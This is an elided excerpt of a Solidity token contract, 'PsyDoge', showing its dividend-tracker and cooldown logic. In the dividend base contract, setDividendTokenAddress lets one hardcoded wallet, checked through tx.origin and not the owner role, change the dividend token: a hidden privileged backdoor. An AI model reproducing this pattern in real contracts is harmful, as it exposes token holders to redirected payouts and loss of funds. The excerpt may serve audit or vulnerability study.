...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x059Da6A5aDb2e07946c8A0e7bb80cC63d62de67d, "Only owner can change dividend contract address");
...
contract PsyDoge is ERC20, Ownable {
    ...
    uint256 public dogeDividendCooldown = 10800; // 3 hours
    uint256 public lastDogeDividend;
    ...
    constructor() ERC20("PSYDOGE", "PSYD") {
    ...
    function updateDogeDividendCooldown(uint256 claimWait) external onlyOwner {
        require(dogeDividendCooldown != claimWait, "Cannot update dogeDividendCooldown to same value");
        dogeDividendCooldown = claimWait;
    }
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (buyBackAndLiquifyEnabled) {
                    ...
                    //     if (buyBackBalance >= uint256(1 * 10**18)) { // 1BNB collected
                    //         buyBackAndBurn(buyBackBalance.div(100).mul(rand()));
                    //     } else {
                ...
                if (dogeDividendEnabled) {
                    ...
                    // swapAndSendDogeDividends(sellTokens.div(100).mul(rand()));
                    tryToSwapAndSendDogeDividends(sellTokens);
                }
    ...
    function tryToSwapAndSendDogeDividends(uint256 tokens) private {
        ...
        if (dogeDividends >= uint256(2 * 10**18) && block.timestamp - lastDogeDividend > dogeDividendCooldown ) { // Dividents greater than 2 BNB
    ...
    function transferDividends(address dividendToken, address dividendTracker, DividendPayingToken dividendPayingTracker, uint256 amount) private {
        ...
        if (success) {
            ...
            lastDogeDividend = block.timestamp;
...
contract DogeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("PsyDoge_Doge_Dividend_Tracker", "PsyDoge_Doge_Dividend_Tracker", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 5000 * (10**18);
    }
